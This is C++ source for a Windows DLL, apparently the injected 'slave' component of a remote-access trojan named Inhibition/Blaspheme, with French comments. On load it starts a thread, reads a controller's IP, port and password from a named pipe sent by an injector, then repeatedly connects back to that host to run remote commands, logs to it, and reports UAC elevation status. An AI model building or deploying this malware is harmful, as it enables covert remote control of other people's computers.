#include <windows.h>
#include <sstream>
HANDLE threadHandle;

#include <blaspheme/Blaspheme.hpp>
#include <common/Convert.hpp>
#include <common/Logger.hpp>
#include <blaspheme/protocol/ConnectionInfo.hpp>
#include <network/Pipe.hpp>
#include <system/Uac.hpp>
#include "InhibitionCore.hpp"
using namespace Inhibition;
using namespace System;

void launch()
{
    LOG << "Connections...";
    while(true)
    {
		try
		{
			if(InhibitionCore::instance().connect())
			{
				while(InhibitionCore::instance().process_command());
				LOG << "Fin de session.";
				InhibitionCore::instance().disconnect();
				LOG << "Connections...";
			}
			Sleep(500);
		}
		catch(Network::Deconnection&)
		{
			LOG << "Deconnexion intempestive.";
			InhibitionCore::instance().disconnect();
		}
    }
}

DWORD WINAPI Run(void)
{
	LOG.setHeader("SLAVE");
#ifdef INNOCENCE_DEBUG
    //LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
#endif

	// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
    // nous envoyer l'injecteur
    // pour ce faire, on utilise les "pipe" à la windows (IPC)
    Network::Pipe pipe_client;
    Blaspheme::ConnectionInfo infos;
    char blaspheme [Blaspheme::DEFAULT_STR_SIZE];
    if(pipe_client.connect(PIPE_NAME))
    {
        pipe_client.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
        std::string buffer(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
		size_t end = buffer.find_last_of(MARKER);
		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);

        std::string port_buffer;
        std::istringstream iss(buffer);

        std::getline( iss, infos.ip, SEPERATOR );
        std::getline( iss, port_buffer, SEPERATOR );
        std::getline( iss, infos.name, SEPERATOR );
        std::getline( iss, infos.password, SEPERATOR );

        from_string(port_buffer, infos.port);
        pipe_client.disconnect();
    }
	else
	{
		SHOW_FATAL_ERROR("Impossible de se connecter au PIPE.");
	}

    LOG.addObserver(new Common::LoggingNetwork(infos.ip, infos.port));
	LOG << GetElevationType();
    InhibitionCore::instance().set_connection_infos(infos);
	try
	{
		launch();
	}
	catch(Network::SocketException& e)
	{
		LOG << e.what();
	}
	catch(Network::PipeError& e)
	{
		LOG << e.what();
	}
	catch(std::exception& e)
	{
		LOG << e.what();
	}
	catch(...)
	{
		LOG << "Erreur d'origine inconnue.";
	}
    LOG << "Client : Ended.";
    // si une erreur devait survenir, il faut s'assurer que le processus injecté meurre avec la DLL
    exit(0);
	return EXIT_SUCCESS;
}

extern "C" BOOL APIENTRY DllMain (HINSTANCE hModule, DWORD dwMsg, LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER( hModule );
    UNREFERENCED_PARAMETER( lpReserved );

    switch( dwMsg )
    {
		case DLL_PROCESS_ATTACH:
			DisableThreadLibraryCalls( hModule );
			threadHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)Run, NULL, 0, 0 );
			return (!threadHandle) ? FALSE : TRUE;
		case DLL_PROCESS_DETACH:
			TerminateThread(threadHandle, EXIT_SUCCESS);
			return TRUE;
    }
    return TRUE;
}
